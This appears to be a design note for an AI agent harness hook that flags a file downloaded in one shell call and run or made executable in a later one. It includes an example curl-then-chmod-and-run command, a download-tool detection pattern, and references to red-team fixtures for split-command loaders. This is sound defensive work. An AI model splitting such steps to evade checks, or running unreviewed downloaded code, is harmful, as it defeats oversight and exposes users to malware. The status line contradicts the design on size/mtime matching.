# Cross-command download-then-run: design (not built)

Status: being built, 2026-11-22. User decisions: ASK, not deny; a Read in between does not clear
the record. Simplified for the first cut: record at PreToolUse inside `safety-detect.py` (no new
hook, no new fork) and match on path only, no size/mtime, so a file rewritten after the download
still asks. Drafts: branch `wip/download-ledger`.

## The gap

`check_download_then_run` (`hooks/safety-detect.py`, #348, hardened in #354) denies a download
that writes a file and then makes it executable or runs it **in the same command**. Split across
two Bash calls, nothing connects them:

```
curl -fsSLo /tmp/h https://example.net/h      # call 1: allowed (a plain download)
chmod +x /tmp/h && /tmp/h                     # call 2: allowed (no download in sight)
```

Fixtures: agent-white-hat `download-chmod-run`, `skill-linked-setup-doc-loader` (the split form).

## Design

**1. Record (PostToolUse, Bash/PowerShell, synchronous).** A new small hook,
`hooks/download-ledger.sh`. Bash prefilter on the command text: `curl|wget|iwr|Invoke-WebRequest|
aria2c|http(ie)?` with an output flag (`-o`, `-O`, `--output`, `>`, `| tee`, `-OutFile`). Only then
fork python, reuse the writer parsing from `check_download_then_run` (move it into a shared
function in `safety-detect.py`, do not copy it), resolve each written path to an absolute,
normalized path (`realpath`; `native()` on Windows), and append
`{path, size, mtime, ts}` to `$SUPERCHARGER_STATE/scope/.downloads-<session_id>`.
Synchronous, not async: PostToolUse finishes before the next PreToolUse, so the record exists
when call 2 arrives. Cap the file at 200 lines (drop the oldest).

**2. Check (PreToolUse, inside the existing safety chain).** In `check_download_then_run`, when a
segment is `chmod` adding execute (same mode parsing as #354), `install -m`, or runs a path
(`./x`, `/abs/x`, `bash x`, `sh x`, interpreter + path), resolve that path the same way and look
it up in the ledger. Match = same path AND same size and mtime (a file later rewritten by the
Write tool is not the downloaded bytes any more).

**3. Verdict: ASK, not deny.** Across two calls the user may have read the file in between, and a
deny here has no in-command evidence to quote. Reason: "runs or makes executable <path>,
downloaded earlier this session from a URL; nobody has reviewed it".

**4. Two-gate trap.** `safety.sh`'s glob gate must admit these commands, or the detector never
sees them. Gate condition: the ledger file exists and is non-empty (`[ -s ]`, fork-free) AND the
command contains `chmod`, `install`, or a path-like first word. No ledger means zero added cost.

## Cost

- No download this session: one `[ -s ]` test per Bash call (≈0 ms).
- Download commands: one python fork in PostToolUse (≈20 ms, from the fork-price table),
  only on commands that pass the prefilter.
- After a download: chmod/run commands pay the existing detector call; no new fork.
- Unmeasured. Measure on a quiet machine before building (load was 70–315 on 2026-11-22).

## Known limits (accept, document in KNOWN-ISSUES)

- A path built at run time (`$OUT`, `$(mktemp)`) is not resolved; same limit as the
  single-command rule.
- Download by a script or a tool the prefilter does not name is not recorded.
- Copy or move after download (`mv /tmp/h ~/bin/h`) breaks the match. A follow-up could record
  `mv`/`cp` of a ledger path; not in the first cut.
- The ledger is per session. A file downloaded in one session and run in another is not caught.

## Tests (each must fail on master)

- download in call 1, `chmod +x` in call 2: ASK
- download in call 1, `./h` in call 2: ASK
- `-O` (URL file name) then `bash h`: ASK
- the same path spelled `./h`, `$PWD/h`, `/tmp/../tmp/h`: ASK
- download, Write tool rewrites the file, then run: allow (size/mtime changed)
- no download this session, `chmod +x script.sh`: allow, and no python fork (shim count)
- different session id: allow
- Windows: `C:/…` and `/c/…` spellings of the same file: ASK

## Open questions for the user

1. ASK (recommended) or deny?
2. Should a Read of the file between the calls clear the record? Recommended: no, a Read by the
   agent is not a human review.
